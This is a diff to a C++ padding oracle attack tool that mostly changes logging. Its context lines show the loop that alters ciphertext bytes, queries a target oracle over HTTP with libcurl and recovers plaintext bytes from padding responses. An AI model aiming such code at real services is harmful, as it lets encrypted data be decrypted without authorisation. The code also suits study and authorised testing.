@@ -1,5 +1,6 @@
-#include <stdexcept> 
 #include <curl/curl.h>
+#include <stdexcept> 
+#include <string>
 #include <mutex>
 
 #include "include/network.h"
@@ -56,7 +57,7 @@ CypherData Fuzz(CURL* curl, std::vector<std::string>& blocks, unsigned int k) {
     std::string newCypher;
     std::string response;
 
-    Log::info("Fuzzing block n°" + std::to_string(k+1));
+    Log::info("Fuzzing block n°" + std::to_string(k+1) + "\n");
     try {
         // For every hex byte, in reverse
         for (j=size-1; j>=2; j=j-2) {
@@ -86,13 +87,10 @@ CypherData Fuzz(CURL* curl, std::vector<std::string>& blocks, unsigned int k) {
                 ModifyBlock(newBlock, hexVal, j);
                 newCypher = BlocksToCypher(blocks, nBlocks, newBlock, k, size);
                 
-                //Log::flushPrint("Cypher: " + newCypher);
-
                 // Senb this new cyphertext to the oracle
                 try {
                     response = GetRequest(curl, Target::getPayload(newCypher));
                 } catch(const std::exception& e) {
-                    std::cout << std::endl;
                     Log::error("Error while making a GET request");
                     Log::error(e.what());
 
@@ -105,16 +103,18 @@ CypherData Fuzz(CURL* curl, std::vector<std::string>& blocks, unsigned int k) {
                 response.clear();
                 if (!padError) {
                     Guess(currentVal, val, padStep, cypherData);
-
-                    std::cout << std::endl;
-                    Log::bingo(
-                        "[BLOCK-" + std::to_string(k) + "]-Found: D=0x" 
-                        + IntToHex(cypherData.Dn[Target::getBlockSize()-padStep])
-                        + " | P=0x" + IntToHex(cypherData.Pn[Target::getBlockSize()-padStep])
+                    std::string strIndex = std::to_string(Target::getBlockSize()-padStep+1);
+                    Log::info(
+                        "[BLOCK-" + std::to_string(k) 
+                        + "]-Found: D[" + strIndex
+                        + "]=0x" + IntToHex(cypherData.Dn[Target::getBlockSize()-padStep])
+                        + " | P["+ strIndex
+                        + "]=0x" + IntToHex(cypherData.Pn[Target::getBlockSize()-padStep])
                     );
                     break;
                 }
             }
+            if (padError) Log::warning("No recovered data for byte " + std::to_string(Target::getBlockSize()-padStep+1));
             padError = true;
             padStep++;
         }
@@ -122,7 +122,6 @@ CypherData Fuzz(CURL* curl, std::vector<std::string>& blocks, unsigned int k) {
         return cypherData;
 
     } catch (const std::exception& e) {
-        std::cout << std::endl;
         Log::error("Error while fuzzing");
         Log::error(e.what());
 
